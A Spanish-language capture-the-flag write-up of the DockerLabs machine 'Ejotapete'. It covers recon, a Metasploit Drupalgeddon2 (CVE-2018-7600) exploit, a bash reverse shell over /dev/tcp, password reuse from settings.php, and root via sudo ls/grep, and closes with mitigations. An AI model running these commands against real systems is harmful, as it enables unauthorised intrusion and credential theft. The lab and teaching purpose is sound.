# Ejotapete
Máquina para explotar una vulnerabilidad en un CMS drupal que no corre en la raíz del puerto 80, así como una escalada de privilegios con dos vías distintas.
# Ejotapete — Writeup

> Máquina CTF de dificultad **fácil/media** para [DockerLabs](https://dockerlabs.es/).
> Explotación de **Drupal 8** mediante *Drupalgeddon2* (CVE-2018-7600), movimiento lateral con credenciales filtradas y escalada a `root` abusando de permisos `sudo`.

| | |
|---|---|
| **Nombre** | Ejotapete |
| **Plataforma** | DockerLabs |
| **Técnicas** | CVE-2018-7600 · Reutilización de credenciales · Abuso de `sudo` (`ls`, `grep`) |
| **Servicios** | HTTP (Apache 2.4.25 / Drupal 8 / PHP 7.2.3) |

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Explotación — Drupalgeddon2](#3-explotación--drupalgeddon2-cve-2018-7600)
4. [Movimiento lateral](#4-movimiento-lateral)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Resumen de la cadena](#6-resumen-de-la-cadena)
7. [Mitigaciones](#7-mitigaciones)

---

## 1. Reconocimiento

Escaneo completo de puertos con detección de versiones y scripts:

```bash
sudo nmap -p- -sS -sC -sV -vvv -T5 -Pn -n 172.17.0.2
```

Solo hay un puerto abierto:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

La raíz del servidor devuelve un **403 Forbidden**, lo que sugiere que el contenido real cuelga de un subdirectorio.

![Forbidden en la raíz](assets/02-forbidden.png)

---

## 2. Enumeración web

Fuzzing de directorios para localizar la aplicación:

```bash
dirb http://172.17.0.2
```

Aparece un directorio prometedor:

```
==> DIRECTORY: http://172.17.0.2/drupal/
```

Identificamos la tecnología con `whatweb`:

```bash
whatweb http://172.17.0.2/drupal
```

```
Drupal, MetaGenerator[Drupal 8 (https://www.drupal.org)],
PHP[7.2.3], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)],
Title[Welcome to Find your own Style]
```

Confirmado: **Drupal 8** sobre PHP 7.2.3.

![Portada de Drupal](assets/01-drupal-home.png)

Una versión de Drupal 8 sin parchear es inmediatamente sospechosa de ser vulnerable a **Drupalgeddon2**.

---

## 3. Explotación — Drupalgeddon2 (CVE-2018-7600)

**CVE-2018-7600** es un fallo de *property injection* en la Forms API de Drupal (7.x y 8.x) que permite ejecución remota de código **sin autenticación**.

Usamos el módulo de Metasploit:

```bash
msfconsole
search CVE-2018-7600
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 172.17.0.2
set TARGETURI /drupal
run
```

> ⚠️ El parámetro clave es `TARGETURI /drupal`: la aplicación **no** está en la raíz, por lo que apuntar a `/` haría fallar el *check*.

```
[+] The target is vulnerable. Detected vulnerable version 8
[*] Meterpreter session 1 opened
meterpreter > shell
www-data@1516a3bf2274:/var/www/html/drupal$
```

Tenemos ejecución de comandos como **`www-data`**.

### Shell reversa (opcional, para estabilidad)

En la máquina atacante:

```bash
nc -lvnp 5555
```

Desde la víctima:

```bash
bash -c 'bash -i >& /dev/tcp/10.0.2.15/5555 0>&1'
```

---

## 4. Movimiento lateral

Buscamos el fichero de configuración de Drupal, que casi siempre guarda credenciales de base de datos:

```bash
find / -name settings.php 2>/dev/null
cat /var/www/html/drupal/sites/default/settings.php
```

Entre los comentarios de ejemplo del fichero hay credenciales reales (y un par de mensajes del *sysadmin*):

```php
'database' => 'database_under_beta_testing', // ...petó la base de datos jiji xd
'username' => 'ballenita',
'password' => 'ballenitafeliz',              // Cuidadito cuidadín pillin
```

Antes de cambiar de usuario, estabilizamos la shell (si no, `su` falla con *"must be run from a terminal"*):

```bash
script -qc /bin/bash /dev/null
```

Reutilizamos la contraseña para saltar al usuario **`ballenita`**:

```bash
su ballenita
# Password: ballenitafeliz
ballenita@1516a3bf2274:/var/www/html/drupal$
```

---

## 5. Escalada de privilegios

Revisamos qué puede ejecutar `ballenita` como `root`:

```bash
sudo -l
```

```
User ballenita may run the following commands on 1516a3bf2274:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

Dos binarios **sin contraseña** como `root`. No dan shell directa, pero sí **lectura arbitraria** de ficheros del sistema.

Enumeramos el home de `root` con `ls` y leemos el secreto con `grep`:

```bash
sudo ls -la /root/
```

```
-rw-r--r-- 1 root root  35 Oct 16  2024 secretitomaximo.txt
```

```bash
sudo grep '' /root/secretitomaximo.txt
```

```
nobodycanfindthispasswordrootrocks
```

> 💡 `grep ''` imprime todas las líneas del fichero (coincide con la cadena vacía): un truco clásico para volcar contenido cuando solo tienes `grep` con privilegios.

Ese fichero contenía la contraseña de `root`, así que simplemente escalamos con `su`:

```bash
su root
# Password: nobodycanfindthispasswordrootrocks
root@1516a3bf2274:/var/www/html/drupal#
```

🏁 **¡`root` conseguido!**

---

## 6. Resumen de la cadena

```
nmap  ──▶  puerto 80 (Apache / 403 en /)
  │
dirb + whatweb  ──▶  /drupal  (Drupal 8, PHP 7.2.3)
  │
CVE-2018-7600 (Drupalgeddon2)  ──▶  RCE como www-data
  │
settings.php  ──▶  credenciales  ballenita:ballenitafeliz
  │
su ballenita  ──▶  sudo -l:  (root) NOPASSWD /bin/ls, /bin/grep
  │
sudo grep '' /root/secretitomaximo.txt  ──▶  password de root
  │
su root  ──▶  🏁 ROOT
```

---

## 7. Mitigaciones

- **Actualizar Drupal** a una versión con el parche de SA-CORE-2018-002 (o migrar, dado que Drupal 8 está *end-of-life*).
- **No almacenar credenciales en texto plano** en `settings.php`; usar variables de entorno o un gestor de secretos y restringir permisos del fichero.
- **No reutilizar contraseñas** entre la base de datos y las cuentas del sistema.
- **Principio de mínimo privilegio en `sudo`**: conceder `ls`/`grep` como `root` equivale a dar lectura total del sistema. Evitar binarios que permitan lectura/escritura arbitraria o *shell escape* (ver [GTFOBins](https://gtfobins.github.io/)).

---

